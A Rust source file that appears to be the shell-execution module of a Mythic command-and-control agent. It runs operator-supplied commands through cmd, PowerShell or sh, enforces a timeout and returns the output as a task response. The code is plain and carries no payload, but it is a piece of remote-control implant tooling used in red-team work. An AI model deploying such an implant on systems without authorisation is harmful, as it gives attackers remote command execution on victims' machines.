//! Shell command execution with timeout.
//!
//! Spawns a child process and reads its output in a background thread.
//! If the process doesn't finish within the timeout, it is killed and
//! partial output is returned.

use std::io::Read;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::time::Duration;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::sys::encoding::decode_output;

const DEFAULT_TIMEOUT_SECS: u64 = 60;

#[derive(Deserialize)]
struct Params {
    command: String,
    #[serde(default = "default_shell")]
    shell: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
}

fn default_shell() -> String {
    if cfg!(windows) { "cmd".into() } else { "sh".into() }
}

const fn default_timeout() -> u64 {
    DEFAULT_TIMEOUT_SECS
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("shell parse error: {e}")),
    };

    let (bin, flag) = match params.shell.as_str() {
        "cmd" => ("cmd", "/c"),
        "powershell" => ("powershell", "-Command"),
        "bash" => ("bash", "-c"),
        "sh" | _ => ("sh", "-c"),
    };

    // Spawn child with piped stdout/stderr
    let mut child = match Command::new(bin)
        .arg(flag)
        .arg(&params.command)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return TaskResponse::failed(task.id, &format!("{} failed: {e}", bin)),
    };

    let child_id = child.id();
    let timeout = Duration::from_secs(params.timeout.max(1)); // minimum 1s

    // Take ownership of pipes
    let mut stdout = child.stdout.take().unwrap();
    let mut stderr = child.stderr.take().unwrap();

    // Background thread: read all output + wait for exit
    let (tx, rx) = mpsc::channel();
    std::thread::spawn(move || {
        let mut out_buf = Vec::new();
        let mut err_buf = Vec::new();
        let _ = stdout.read_to_end(&mut out_buf);
        let _ = stderr.read_to_end(&mut err_buf);
        let status = child.wait().ok();
        let _ = tx.send((status, out_buf, err_buf));
    });

    match rx.recv_timeout(timeout) {
        Ok((status, out_buf, err_buf)) => {
            let stdout_str = decode_output(&out_buf);
            let stderr_str = decode_output(&err_buf);
            let output = if stderr_str.is_empty() {
                stdout_str
            } else {
                format!("{stdout_str}\n{stderr_str}")
            };

            let code = status.and_then(|s| s.code()).unwrap_or(-1);
            let result_msg = if code == 0 {
                output
            } else {
                format!("{output}\n[exit code: {code}]")
            };

            TaskResponse {
                task_id: task.id,
                completed: Some(true),
                status: Some("completed".into()),
                user_output: Some(result_msg),
                ..Default::default()
            }
        }
        Err(mpsc::RecvTimeoutError::Timeout) => {
            // Kill the child
            let pid = child_id;
            #[cfg(unix)]
            {
                let _ = Command::new("kill").args(["-9", &pid.to_string()]).output();
            }
            #[cfg(windows)]
            {
                let _ = Command::new("taskkill")
                    .args(["/F", "/PID", &pid.to_string()])
                    .output();
            }

            TaskResponse::failed(
                task.id,
                &format!(
                    "{} timed out after {}s (command: {})",
                    bin, params.timeout, params.command
                ),
            )
        }
        Err(mpsc::RecvTimeoutError::Disconnected) => {
            TaskResponse::failed(task.id, &format!("{} process terminated unexpectedly", bin))
        }
    }
}
